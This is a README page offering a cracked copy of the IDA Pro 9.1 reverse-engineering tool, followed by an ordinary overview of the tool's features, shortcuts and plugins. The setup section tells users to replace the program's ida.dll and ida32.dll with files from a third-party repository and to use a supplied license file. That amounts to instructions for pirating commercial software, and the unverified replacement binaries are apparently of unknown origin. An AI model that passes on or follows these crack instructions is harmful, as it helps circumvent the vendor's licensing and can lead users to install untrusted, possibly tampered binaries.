# 🔍 IDA Pro 9.1 Cr*cked

> A powerful reverse engineering tool for disassembling, debugging, and analyzing binary files.

> **Thanks to @vxcn for giving it**

---

## ⚙️ How to Set It Up

1. Run `ida-pro_91_x64win.exe` and complete the installation
2. Go to the install directory:
   ```
   C:\Program Files\IDA Professional 9.1
   ```
3. Replace the existing `ida.dll` and `ida32.dll` with:
   - [ida.dll](https://github.com/benzis-alt/IDA-Pro-9.1/blob/main/other%20files%20you%20need/ida.dll)
   - [ida32.dll](https://github.com/benzis-alt/IDA-Pro-9.1/blob/main/other%20files%20you%20need/ida32.dll)
4. Use the license file:
   - [idapro.hexlic](https://github.com/benzis-alt/IDA-Pro-9.1/blob/main/other%20files%20you%20need/idapro.hexlic)

---

## 📌 What is IDA Pro?

**IDA Pro** (Interactive DisAssembler Professional) is an industry-standard reverse engineering tool developed by **Hex-Rays**. It allows security researchers, malware analysts, and developers to analyze compiled binaries without access to the original source code.

Version **9.1** brings improved decompilation, enhanced processor support, and a more refined UI experience.

---

## ✨ Key Features

- 🧩 **Disassembler** — Converts machine code into human-readable assembly
- 🔄 **Decompiler** (Hex-Rays) — Generates C-like pseudocode from binaries
- 🐛 **Debugger** — Supports local and remote debugging across multiple platforms
- 🌐 **Multi-architecture** — x86, x64, ARM, MIPS, and many more
- 🔌 **Plugin Support** — Extend functionality with Python or C++ plugins
- 📁 **Wide format support** — PE, ELF, Mach-O, raw binaries, and more

---

## 🖥️ Supported Platforms

| Platform | Support |
|----------|---------|
| Windows  | ✅ Full |
| Linux    | ✅ Full |
| macOS    | ✅ Full |

---

## 🚀 Getting Started

### 1. Launch IDA Pro
Open a binary file directly or drag and drop it into the IDA Pro window.

### 2. Select Architecture
IDA will auto-detect the binary format and processor architecture.

### 3. Analyze
Let the auto-analysis run. IDA will identify functions, strings, imports, and more.

### 4. Navigate
Use the **Functions window**, **Strings window**, and **Imports/Exports** to explore the binary.

---

## 🛠️ Useful Shortcuts

| Shortcut | Action |
|----------|--------|
| `F5` | Open Hex-Rays decompiler (pseudocode view) |
| `G` | Go to address |
| `N` | Rename variable or function |
| `X` | Show cross-references |
| `Space` | Toggle graph / text view |
| `Ctrl + F` | Search in disassembly |
| `Alt + T` | Search for text string |
| `Esc` | Go back in navigation |

---

## 🔌 Popular Plugins

| Plugin | Description |
|--------|-------------|
| [Keypatch](https://github.com/keystone-engine/keypatch) | Patch binaries directly in IDA |
| [FLIRT Signatures](https://hex-rays.com/products/ida/tech/flirt/) | Identify library functions |
| [BinDiff](https://www.zynamics.com/bindiff.html) | Compare two binaries |
| [ret-sync](https://github.com/bootleg/ret-sync) | Sync IDA with live debuggers |

---

## 📚 Resources

- 📖 [Hex-Rays Official Docs](https://hex-rays.com/documentation/)
- 💬 [Hex-Rays Forum](https://hex-rays.com/forums/)
- 🎓 [Reverse Engineering StackExchange](https://reverseengineering.stackexchange.com/)
- 🧪 [crackmes.one](https://crackmes.one/) — Practice RE challenges
